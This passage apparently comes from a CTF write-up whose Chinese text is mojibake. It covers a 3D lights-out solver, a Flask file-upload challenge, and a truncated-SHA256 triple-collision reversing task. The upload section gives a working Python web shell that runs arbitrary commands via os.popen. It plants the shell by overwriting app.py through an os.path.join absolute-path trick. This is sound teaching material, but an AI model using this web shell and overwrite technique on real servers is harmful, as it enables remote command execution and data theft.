# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºç”Ÿæˆéšæœºçš„æ¸¸æˆå±€é¢
def generate_puzzle(n: int) -> np.array:
    # ç”Ÿæˆéšæœºå­—èŠ‚åºåˆ—ï¼Œé•¿åº¦è¶³ä»¥è¦†ç›–æ•´ä¸ªç«‹æ–¹ä½“çš„æ‰€æœ‰ä½
    random_bytes = get_random_bytes((n**3) // 8 + 1)
    
    # å°†éšæœºå­—èŠ‚åºåˆ—è§£åŒ…ä¸ºä½æ•°ç»„ï¼Œå¹¶æˆªå–å‰ n^3 ä¸ªä½
    switch_array = np.unpackbits(np.frombuffer(random_bytes, dtype=np.uint8))[:(n**3)].reshape(n, n, n)
    
    # æ ¹æ®å¼€å…³æ•°ç»„è®¡ç®—ç¯çš„çŠ¶æ€æ•°ç»„
    lights_array = convert_switch_array_to_lights_array(switch_array)
    
    return lights_array

# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåˆ›å»ºçº¿æ€§æ–¹ç¨‹ç»„
def create_linear_system(n, lights_array):
    # åˆ›å»ºå¢å¹¿çŸ©é˜µï¼Œå·¦ä¾§æ˜¯ç³»æ•°çŸ©é˜µï¼Œå³ä¾§æ˜¯å¸¸æ•°å‘é‡
    matrix = np.zeros((n**3, n**3 + 1), dtype=int)
    
    # éå†æ¯ä¸ªç¯çš„ä½ç½®
    for i in range(n):
        for j in range(n):
            for k in range(n):
                index = i * n**2 + j * n + k  # è®¡ç®—å½“å‰ç¯åœ¨çŸ©é˜µä¸­çš„ç´¢å¼•
                
                # å½“å‰ç¯çš„ä½ç½®è®¾ç½®ä¸º1
                matrix[index, index] = 1
                
                # æ·»åŠ ç›¸é‚»ä½ç½®çš„å½±å“
                for di, dj, dk in [(-1, 0, 0), (1, 0, 0), (0, -1, 0), (0, 1, 0), (0, 0, -1), (0, 0, 1)]:
                    ni, nj, nk = i + di, j + dj, k + dk
                    if 0 <= ni < n and 0 <= nj < n and 0 <= nk < n:
                        neighbor_index = ni * n**2 + nj * n + nk
                        matrix[index, neighbor_index] = 1  # ç›¸é‚»ä½ç½®çš„å¼€å…³å½±å“å½“å‰ç¯
                
                # è®¾ç½®å¸¸æ•°é¡¹
                matrix[index, -1] = lights_array[i, j, k]
    
    return matrix

# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œé«˜æ–¯æ¶ˆå…ƒæ³•
def gauss_elimination(matrix):
    n = len(matrix)
    
    # éå†æ¯ä¸€è¡Œ
    for i in range(n):
        # å¯»æ‰¾ä¸»å…ƒ
        max_row = i
        for k in range(i + 1, n):
            if abs(matrix[k, i]) > abs(matrix[max_row, i]):
                max_row = k
        
        # äº¤æ¢è¡Œ
        matrix[[i, max_row]] = matrix[[max_row, i]]
        
        # ä¸»å…ƒå½’ä¸€åŒ–
        pivot = matrix[i, i]
        if pivot != 0:
            matrix[i] = matrix[i] / pivot % 2  # åœ¨æ¨¡2ä¸‹å½’ä¸€åŒ–
        
        # æ¶ˆé™¤å…¶ä»–è¡Œçš„ä¸»å…ƒå½±å“
        for k in range(n):
            if k != i:
                factor = matrix[k, i]
                matrix[k] = (matrix[k] - factor * matrix[i]) % 2  # åœ¨æ¨¡2ä¸‹æ¶ˆé™¤å½±å“
    
    return matrix

# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè§£å†³è°œé¢˜
def solve_puzzle(n, lights_array):
    # åˆ›å»ºçº¿æ€§æ–¹ç¨‹ç»„
    linear_system = create_linear_system(n, lights_array)
    
    # æ‰§è¡Œé«˜æ–¯æ¶ˆå…ƒæ³•
    solution_matrix = gauss_elimination(linear_system)
    
    # æå–è§£å‘é‡
    solution_vector = solution_matrix[:, -1]
    
    return solution_vector

# æµ‹è¯•è§£é¢˜å™¨
difficulty = 1  # å¯ä»¥é€‰æ‹©1, 2, æˆ– 3
if difficulty == 1:
    n = 3
elif difficulty == 2:
    n = 5
elif difficulty == 3:
    n = 11
else:
    raise ValueError("Invalid difficulty level")

# ç”Ÿæˆéšæœºçš„æ¸¸æˆå±€é¢
lights_array = generate_puzzle(n)

# è§£å†³è°œé¢˜
solution = solve_puzzle(n, lights_array)

# éªŒè¯ç­”æ¡ˆ
switch_array = solution.reshape(n, n, n)
actual_lights_array = convert_switch_array_to_lights_array(switch_array)

# æ£€æŸ¥è§£æ˜¯å¦æ­£ç¡®
if np.array_equal(lights_array, actual_lights_array):
    print("Puzzle solved!")
else:
    print("Solution is incorrect.")
```

# ç¦æ­¢å†…å·

å…ˆçœ‹æºç ï¼š

```python
file = request.files['file']
filename = file.filename
filepath = os.path.join(UPLOAD_DIR, filename)
file.save(filepath)
```

å¯¹ä¸Šä¼ æ–‡ä»¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè€ƒè™‘æ‰“shellã€‚æ³¨æ„åˆ°

> å¯åŠ¨çš„**å®Œæ•´å‘½ä»¤**ä¸º `flask run --reload --host 0`ã€‚ç½‘ç«™ä»£ç è¿è¡Œåœ¨ `/tmp/web`ã€‚

**å®Œæ•´å‘½ä»¤**å¹¶æ²¡æœ‰å¸¦æ–‡ä»¶åï¼Œç›´æ¥å°±å¯åŠ¨äº†ã€‚æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ

> Application Discovery Behavior
>
> As a shortcut, if the file is named `app.py` or `wsgi.py`, you donâ€™t have to use `--app`. See [Command Line Interface](https://flask.palletsprojects.com/en/stable/cli/) for more details.

å½“å‰ç›®å½•å­˜åœ¨app.pyæˆ–wsgi.pyæ—¶ï¼Œ`flask run`å¯ä»¥è‡ªåŠ¨å‘ç°ï¼Œæ— éœ€æŒ‡å®šå¯åŠ¨æ–‡ä»¶åã€‚é‚£å°±å¥½åŠäº†ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªpyè¦†ç›–æ‰åŸæ¥çš„ã€‚wsgiè¿™ä¸ªåå­—å¤ªä¸å¸¸è§äº†ï¼Œæˆ‘ä»¬å…ˆè¯•è¯•appã€‚

å…ˆå†™shellï¼š

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/run')
def run_command():
    user_command = request.args.get('command', '')
    result = os.popen(user_command).read()
    return result

if __name__ == '__main__':
    app.run(debug=True)
```

å†™å¥½åç›´æ¥å¯åŠ¨BurpSuiteï¼Œéšä¾¿é€‰ä¸€ä¸ªæ–‡ä»¶ï¼Œå¼€å§‹æ‹¦åŒ…ç‚¹ä¸Šä¼ ã€‚

![](images/672fa53cd29ded1a8cd0825d.png)

æ³¨æ„åˆ°`filepath = os.path.join(UPLOAD_DIR, filename)`ã€‚è¿™ç©æ„é™¤äº†æ‹¼æ¥æ–‡ä»¶è·¯å¾„è¿˜æœ‰ä¸ªç‰¹æ€§ï¼šè‹¥å­˜åœ¨ä»¥`/`å¼€å¤´çš„è·¯å¾„ï¼Œä»æœ€åä¸€ä¸ªä»¥`/`å¼€å¤´çš„è·¯å¾„å¼€å§‹æ‹¼æ¥ï¼Œä¹‹å‰å‚æ•°å…¨éƒ¨ä¸¢å¼ƒï¼›æˆ‘ä»¬æŠŠä¸Šä¼ è·¯å¾„æ”¹ä¸ºç»å¯¹è·¯å¾„ï¼Œ`os.path.join()`æ€»æ˜¯ä¼šè¿”å›æˆ‘ä»¬çš„ç»å¯¹è·¯å¾„ã€‚

> æœ¬é¢˜çš„ flag ä½äºè¯„åˆ†æ•°æ®**åŸå§‹ JSON æ–‡ä»¶**çš„åˆ—è¡¨å¤´éƒ¨ï¼Œå°†å¯¹åº”çš„æ•°å­—åŠ  65 åä½¿ç”¨ ASCII ç¼–ç è½¬æ¢åå³ä¸º flag æ–‡æœ¬ã€‚

æŸ¥çœ‹é¢˜ç›®é€»è¾‘ï¼Œå‘ç°åŒç›®å½•ä¸‹answers.jsonä¸ºè¯„åˆ†æ•°æ®ã€‚ç›´æ¥è®¿é—®`/run?command=cat answers.json`è·å–ï¼š

![](images/672fa687d29ded1a8cd16c22.png)

è½¬æ¢æˆASCIIï¼š

```python
NUMBERS = [1,2,3,4]
# å¯è§†ASCIIç èŒƒå›´æ˜¯32åˆ°126ä¹‹é—´çš„å€¼
VISIBLE_ASCII_RANGE = range(32, 127)

def convert_to_ascii(numbers):
    for number in numbers:
        ascii_value = number + 65
        if ascii_value in VISIBLE_ASCII_RANGE:
            print(chr(ascii_value), end='')
    print()  # æ¢è¡Œ

convert_to_ascii(NUMBERS)
```

å³å¯å¾—åˆ°flagã€‚

# å“ˆå¸Œä¸‰ç¢°æ’

## ä¸‰ç¢°æ’ä¹‹ä¸€

ä¸‹è½½æ¥é™„ä»¶ï¼Œå‘ç°æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘é¢˜

![](images/672fa8ded29ded1a8cd2ed6b.png)

**ï¼ï¼ï¼å…¨ç½‘å‘¼å«æ³•å›½å¥³äººï¼ï¼ï¼**

![](images/672fa94cd29ded1a8cd335ad.jpg)

![](images/672faa31d29ded1a8cd3b700.png)

è¿™......SHA256èƒ½ç¢°ï¼Ÿå“¥ä»¬æ²¡å¼€ç©ç¬‘å§ï¼Ÿå†çœ‹ä¸€çœ¼......

![](images/672fac6bd29ded1a8cd51606.png)

ä½ è¿™hashæ€ä¹ˆè¿˜intçš„......è¿™ä¸æ‰4ä¸ªå­—èŠ‚ï¼Ÿå†çœ‹ä¸€çœ¼ã€‚å®˜æ–¹writeupä½¿ç”¨OpenAI o1æŠŠä¼ªä»£ç è½¬æˆPythonäº†ï¼Œè¿™é‡Œæ‰‹ç®—ä¸€ä¸‹ï¼Œäº†è§£ä¸€ä¸‹åŸç†ã€‚

~~è€Œä¸”æˆ‘è®¤ä¸ºåº”è¯¥ä½¿ç”¨è´µæ ¡CLAPè®ºæ–‡çš„äº§ç‰©å¯¹æ±‡ç¼–è¿›è¡Œè§£é‡Šã€‚~~

```c
  for ( j = 0; j <= 2; ++j )
  {
    SHA256(&inputArray[j], 8LL, &v15[32 * j + 30]);
    *(&hash1 + j) = 0;
    for ( k = 0; k <= 3; ++k )
      *(&hash1 + j) = *((unsigned __int8 *)&savedregs + 32 * j + k - 84) | (*(&hash1 + j) << 8);
  }
```

foråœ¨æ­¤å¤„éå†3æ¬¡ï¼Œæˆ‘ä»¬åªçœ‹ç¬¬ä¸€æ¬¡å°±å¥½äº†ï¼ˆj=0ï¼‰ã€‚

ç¨‹åºè¯»å…¥ä¸‰ä¸ª8å­—èŠ‚æ•°æ®åå­˜å…¥inputArrayï¼Œè¿›è¡ŒSHA256è¿ç®—åå°†äº§ç”Ÿçš„32å­—èŠ‚æ•°æ®å­˜å…¥v15åç§»30å­—èŠ‚å¤„ã€‚ç”±äº

```c
char v15[134]; // [rsp+72h] [rbp-8Eh] BYREF
```

åœ¨æœ¬è½®å¾ªç¯ä¸­ï¼Œäº§ç”ŸSHA256å“ˆå¸Œçš„èµ·å§‹åœ°å€ä½äº0x72+30=0x90ï¼Œç»ˆæ­¢äº0x90+32=0xB0ã€‚

åœ¨ä¸‹é¢çš„kå¾ªç¯ä¸­ï¼Œç¨‹åºæ¯æ¬¡ä»savedregsï¼ˆrsp+100hï¼‰åç§»-84å­—èŠ‚å¼€å§‹è¯»å–ã€‚åœ°å€ä¸º0xACï¼Œä¸€ç›´è¯»åˆ°0xB0åˆ°è¾¾SHA256æœ€ä½ä½ï¼Œå¹¶é€šè¿‡ç§»ä½ç¡®ä¿å…ˆè¯»çš„å­—èŠ‚ä½äºé«˜ä½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·è¾“å…¥ä¸‰ä¸ª8å­—èŠ‚æ•°æ®åï¼Œç¨‹åºæœ€ç»ˆæ¯”å¯¹çš„æ˜¯å…¶SHA256çš„â€œåå››ä¸ªå­—èŠ‚â€ã€‚

äº†è§£äº†è¿™äº›ï¼Œæ ¹æ®ç”Ÿæ—¥æ‚–è®ºï¼Œåœ¨æ‰€æœ‰å…«å­—èŠ‚æ•°æ®ä¸­äº§ç”Ÿå››å­—èŠ‚å“ˆå¸Œå€¼ç¢°æ’çš„æ¦‚ç‡æ˜¯æ¯”è¾ƒé«˜çš„ã€‚æˆ‘ä»¬å¯ä»¥å†™ä¸ªpythonè„šæœ¬è¿›è¡Œæšä¸¾ï¼š

```python
import hashlib
from collections import defaultdict

def sha256_last_4_bytes(hex_str):
    """ è®¡ç®—ç»™å®š16è¿›åˆ¶å­—ç¬¦ä¸²çš„SHA256å“ˆå¸Œï¼Œå¹¶è¿”å›æœ€åå››ä¸ªå­—èŠ‚ """
    hash_object = hashlib.sha256(bytes.fromhex(hex_str))
    return hash_object.digest()[-4:]

def find_triplicate_last_4_bytes():
    # å­˜å‚¨æ¯ä¸ªæœ€åå››ä½çš„è®¡æ•°
    last_4_bytes_count = defaultdict(int)
    # å­˜å‚¨æ¯ä¸ªæœ€åå››ä½å¯¹åº”çš„åŸå§‹è¾“å…¥å€¼
    last_4_bytes_inputs = defaultdict(list)

    for i in range(16**16):  # éå†æ‰€æœ‰å¯èƒ½çš„å…«å­—èŠ‚16è¿›åˆ¶æ•°
        hex_str = f'{i:016x}'  # å°†æ•°å­—è½¬æ¢ä¸º16ä½å›ºå®šé•¿åº¦çš„16è¿›åˆ¶å­—ç¬¦ä¸²
        last_4_bytes = sha256_last_4_bytes(hex_str)
        
        # æ›´æ–°è®¡æ•°å™¨
        last_4_bytes_count[last_4_bytes] += 1
        last_4_bytes_inputs[last_4_bytes].append(hex_str)

        # æ£€æŸ¥æ˜¯å¦æœ‰ä¸‰ä¸ªç›¸åŒçš„åå››ä½
        if last_4_bytes_count[last_4_bytes] == 3:
            print("æ‰¾åˆ°äº†ä¸‰ä¸ªå…·æœ‰ç›¸åŒæœ€åå››ä¸ªå­—èŠ‚çš„SHA256å€¼:")
            for input_hex in last_4_bytes_inputs[last_4_bytes]:
                print(f"è¾“å…¥å€¼: {input_hex}, SHA256æœ€åå››ä¸ªå­—èŠ‚: {last_4_bytes.hex()}")
            return True

    return False

if __name__ == "__main__":
    find_triplicate_last_4_bytes()
```

```
[Running] python -u "/tmp/tempCodeRunnerFile.python"
æ‰¾åˆ°äº†ä¸‰ä¸ªå…·æœ‰ç›¸åŒæœ€åå››ä¸ªå­—èŠ‚çš„SHA256å€¼:
è¾“å…¥å€¼: 000000000017df1a, SHA256æœ€åå››ä¸ªå­—èŠ‚: 81ce7a42
è¾“å…¥å€¼: 000000000021a19f, SHA256æœ€åå››ä¸ªå­—èŠ‚: 81ce7a42
è¾“å…¥å€¼: 000000000054b820, SHA256æœ€åå››ä¸ªå­—èŠ‚: 81ce7a42

[Done] exited with code=0 in 13.79 seconds
```

åªä½¿ç”¨13.79ç§’å°±æ‰¾åˆ°äº†è‰ºæœ¯çº§ä¸‰ç¢°æ’ã€‚

